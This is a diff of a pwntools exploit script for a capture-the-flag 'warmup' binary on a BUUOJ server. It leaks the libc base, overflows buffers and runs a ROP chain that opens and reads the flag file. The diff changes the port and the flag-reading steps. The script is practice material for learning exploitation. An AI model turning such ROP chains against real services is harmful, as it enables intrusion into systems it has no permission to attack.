@@ -1,8 +1,7 @@
 from pwn import*
-context.log_level =='debug'
 context(arch = 'amd64',os = 'linux')
 while True:
-	p = remote('node3.buuoj.cn',29891)
+	p = remote('node3.buuoj.cn',27526)
 	#p = process('./warmup')
 	libc = ELF('./libc-2.23.so',checksec=False)
 	p.recvuntil('gift: ')
@@ -13,7 +12,6 @@ while True:
 	read = libc.sym['read'] + libc_base
 	open = libc.sym['open'] + libc_base
 	buf = libc.sym['_IO_2_1_stderr_'] + libc_base
-
 	rop = flat([
 		# read(0,buf,0x20)
 		pop_rdi_ret, 0, pop_rdx_rsi_ret, 0x20, buf, read,
@@ -28,13 +26,9 @@ while True:
 		p.sendafter('something: ','\x00'*0xD0 + rop)
 		p.sendafter('name?','\x00'*0x70 +'\x18')
 		p.recvuntil('!')
-		p.sendline('./flag')
-		data = p.recv()
-		if data.startswith('flag'):
-			break
-		else:
-			continue
+		p.sendline('flag\x00')
+		p.recvline()
+		log.info(p.recv())
 	except:
 		p.close()
 		continue
-p.interactive()
